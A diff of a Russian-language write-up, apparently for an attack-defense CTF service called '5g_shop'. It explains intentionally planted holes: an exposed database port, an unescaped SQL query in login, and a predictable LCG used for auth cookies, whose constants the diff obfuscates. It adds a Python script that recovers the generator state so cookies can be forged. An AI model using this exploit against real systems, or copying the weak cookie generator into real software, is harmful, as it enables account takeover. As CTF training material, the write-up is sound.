@@ -1,17 +1,8 @@
-# Нулевая уязвимость
-
-В файле [docker-compose.yml](../../services/5g_shop/docker-compose.yml) в секции инициализации образа postgresql разработчик сервиса, 
-видимо, забыл после очередной отладки сервиса, что открывал порты. Надо либо убирать строчку про порты (у контейнеров общая сеть), либо менять пароль ролей в бд.
-```yml
-    ports:
-      - "5432:5432"
-```
-
 # Первая уязвимость
 
 Бэкэнд сервиса в качестве базы данных использует postgresql. Так как С++ относительно низкоуровневый язык, то сервис не пользуется никакими ORM, 
 но всю работу с базой проделывает через сырые запросы с помощью библиотеки [libpq](https://www.postgresql.org/docs/current/libpq.html). Следовательно,
-есть поле для SQL инъекций. При этом почти все места, куда можно было бы вставить инъекцию защищены функцией экранирования PQescapeLiteral. Кроме одного места - 
+есть поле для разгула SQL инъекций. При этом почти все места, куда можно было бы вставить инъекцию защищены функцией экранирования PQescapeLiteral. Кроме одного места - 
 [метода, используемого при авторизации пользователя](../../services/5g_shop/back/internal/src/services/UsersService.cpp#L98):
 ```cpp
     auto query = Format(
@@ -23,7 +14,7 @@
     result = PQexec(conn, query.c_str());
 ```
 
-Сюда можно вставлять практически любой SQL запрос, однако на выходе есть [проверка на "количество и качество"](../../services/5g_shop/back/internal/src/services/UsersService.cpp#L105), которая сильно затрудняет 
+Сюда можно вставлять практически любой SQL запрос, однако на выходе есть [проверка на "количество и качество"](../../services/5g_shop/back/internal/src/services/UsersService.cpp#L105), которая несколько затрудняет 
 извлечение данных через простые запросы:
 ```cpp
     if (PQresultStatus(result) != PGRES_TUPLES_OK || PQntuples(result) != 1) {
@@ -63,7 +54,9 @@
 
 В сервисе используется самописный генератор uuid4 для кук авторизации пользователей. Генератор основан на линейном конгруэнтном методе, который легко взламывается. [UUID.cpp](services/5g_shop/back/internal/src/tools/UUID.cpp#L14)
 ```cpp
-static volatile uint32_t x, a = 1103515245, c = 1013904223;
+volatile uint8_t ab[] = {0x41, 0x3c, 0xc6, 0xf3, 0x4e, 0x5f, 0x6d};
+volatile uint8_t cb[] = {0x3c, 0x41, 0x6e, 0xc6, 0xf3, 0x6d, 0x5f};
+static volatile uint32_t x;
 static bool initialized = false;
 
 static char alpha[] = "0123456789abcdef";
@@ -76,6 +69,9 @@ namespace shop {
             x = std::time(nullptr);
         }
 
+        uint32_t a = (ab[0] << 24) | (ab[2] << 16) | (ab[4] << 8) | ab[6];
+        uint32_t c = (cb[0] << 24) | (cb[2] << 16) | (cb[4] << 8) | cb[6];
+
         x = x * a + c;
 
         return static_cast<uint16_t>((x & 0xFFFF0000) >> 16);
@@ -83,7 +79,7 @@ namespace shop {
 }
 ```
 
-Более того, получаемые uuid почти полностью выдают стейт генератора, лишнь меняя полубайты местами и выводя сгенерированные числа "в bit endian'e":
+Более того, получаемые uuid почти полностью выдают стейт генератора, лишь меняя полубайты местами и выводя сгенерированные числа "в bit endian'e":
 ```cpp
 int counters[] = {4, 2, 2, 8};
 
@@ -118,5 +114,54 @@ int counters[] = {4, 2, 2, 8};
     return ss.str();
 ```
 
-Поэтому восстановить состояние 
+Поэтому восстановить состояние можно, создав пользователя и "посмотрев" на его куку. После восстановленного состояния можно генерировать авторизационные куки. Чтобы не перебирать пары (пользователь, кука) можно 
+воспользоваться сортировкой всех пользователей по полю `created_at` таковых из метода `/api/users/list`. Код получания состояния генератора может выглядеть [так:](./broken-uuid/sploit.py)
+```python
+import requests
+import uuid
+
+
+r = requests.post(f'http://localhost:4040/api/users', json={'login': str(uuid.uuid4()), 'password_hash': str(uuid.uuid4()), 'credit_card_info': 'some card'})
+
+if r.status_code != 201:
+    print(r, r.content)
+    exit(0)
+
+
+cookie = r.json()['auth_cookie']
+
+print(cookie)
+
+x1 = int(''.join(reversed(cookie[0:4])), 16)
+x2 = int(''.join(reversed(cookie[4:8])), 16)
+
+print(hex(x1), hex(x2))
+
+# параметры генератора из бинарника сервиса
+a = 0x41c64e6d
+c = 0x3c6ef35f
+
+low = 0
+lows = []
+while low < (1 << 16):
+    if ((((low | (x1 << 16)) * a + c) & 0xFFFF0000) >> 16) == x2:
+        lows.append(low)
+    low += 1
+
+
+for low in lows:
+    x = (x1 << 16) | low
+    def rand():
+        global x
+        x = (x * a + c) & 0xFFFFFFFF
+        return (x & 0xFFFF0000) >> 16
+    b = [x, rand(), rand(), rand(), rand(), rand(), rand(), rand()]
+    s = ''
+    for l in b:
+        s += ''.join(reversed((hex(l)[2:]).zfill(4)))
+    print(x, s)
+
+    if s[4:] == cookie.replace('-', ''):
+        print('found! current state is ', x, a, c)
+```
 
